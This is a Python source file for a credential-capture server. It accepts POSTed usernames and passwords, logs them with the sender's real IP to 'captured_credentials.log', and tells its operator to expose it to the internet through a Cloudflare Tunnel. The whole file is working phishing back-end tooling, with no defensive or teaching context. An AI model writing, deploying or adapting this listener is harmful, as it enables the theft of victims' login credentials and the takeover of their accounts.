from http.server import HTTPServer, BaseHTTPRequestHandler
import json
import datetime
import os

LOG_FILE = "captured_credentials.log"


def log_to_file(entry: str):
    with open(LOG_FILE, "a", encoding="utf-8") as f:
        f.write(entry + "\n")


class Listener(BaseHTTPRequestHandler):
    def do_POST(self):
        timestamp = datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S")
        source_ip = self.client_address[0]
        # Cloudflare Tunnel passes the real client IP in this header
        real_ip = self.headers.get("CF-Connecting-IP") or self.headers.get("X-Forwarded-For") or source_ip

        content_length = int(self.headers.get("Content-Length", 0))
        raw = self.rfile.read(content_length) if content_length else b""

        try:
            data = json.loads(raw.decode("utf-8"))
            username = data.get("username", "N/A")
            password = data.get("password", "N/A")

            entry = (
                f"\n[{timestamp}] NEW CAPTURE from {real_ip}\n"
                f"  USERNAME : {username}\n"
                f"  PASSWORD : {password}\n"
                f"{'=' * 40}"
            )
            print(entry)
            log_to_file(entry)

        except Exception:
            raw_str = raw.decode("utf-8", errors="replace")
            print(f"[{timestamp}] Raw data from {real_ip}: {raw_str}")
            log_to_file(f"[{timestamp}] RAW: {raw_str}")

        self.send_response(200)
        self.send_header("Content-Type", "text/plain")
        self.end_headers()
        self.wfile.write(b"OK")

    def do_GET(self):
        self.send_response(200)
        self.end_headers()
        self.wfile.write(b"Listener active.")

    def log_message(self, format, *args):
        pass  # suppress default per-request stdout noise


def run(port=8000):
    startup = datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S")
    log_to_file(f"[{startup}] Listener started on port {port}")

    print(f"[*] Listener started on 0.0.0.0:{port}")
    print(f"[*] Credentials will also be saved to: {os.path.abspath(LOG_FILE)}")
    print("[*] Run Cloudflare Tunnel in another terminal:")
    print(f"    cloudflared tunnel --url http://localhost:{port}\n")
    HTTPServer(("0.0.0.0", port), Listener).serve_forever()


if __name__ == "__main__":
    run()
